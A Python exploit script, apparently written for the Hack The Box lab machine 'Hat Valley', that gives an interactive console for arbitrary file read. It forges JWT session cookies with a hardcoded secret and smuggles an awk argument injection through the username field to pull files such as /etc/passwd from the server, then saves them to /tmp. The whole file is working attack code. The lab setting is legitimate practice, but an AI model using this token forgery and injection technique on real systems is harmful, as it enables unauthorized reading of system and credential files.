#!/usr/bin/python3
#
# Usage: Type the absolute path of the file eg "/etc/passwd", if you want save the file just type "save" in console. 
#         The file will be saved in the /tmp directory.
# Warning: Before Running the script, make sure your hostfile contains the target hostname "http://hat-valley.htb".
# Author: @akhil0x8

import requests
import jwt
import random

class ArbitraryFileRead:

	def __init__(self):
		self.secret = "123beany123"
		self.url = "http://hat-valley.htb/api/all-leave"
		self.random = random.randrange(10000,99999)

	def MakeToken(self,FileName):
		awk = f"/\' {FileName} \'"
		payload_data = {"username":awk,"iat":1666934767}
		token = jwt.encode(payload=payload_data,key=self.secret)
		data = self.ReadFile(token)
		return data

	def ReadFile(self,token):
		cookie = {"token":token}
		response = requests.get(url=self.url,cookies=cookie)
		print(response.text)
		return response

	def SaveFile(self,FileContent):
		#Change the path for changing the file saving path to whatever you want.
		path = f"/tmp/{self.random}"
		file = open(path,"wb")
		file.write(FileContent.content)
		file.close()
		print(f"file saved in {path}")

file = ArbitraryFileRead()

try:
	while True:
		prompt = "console > "
		FileName = input(prompt)
		if FileName != "save":
			FileContent = file.MakeToken(FileName)
		else:
			file.SaveFile(FileContent)

except KeyboardInterrupt:
	print(" exiting")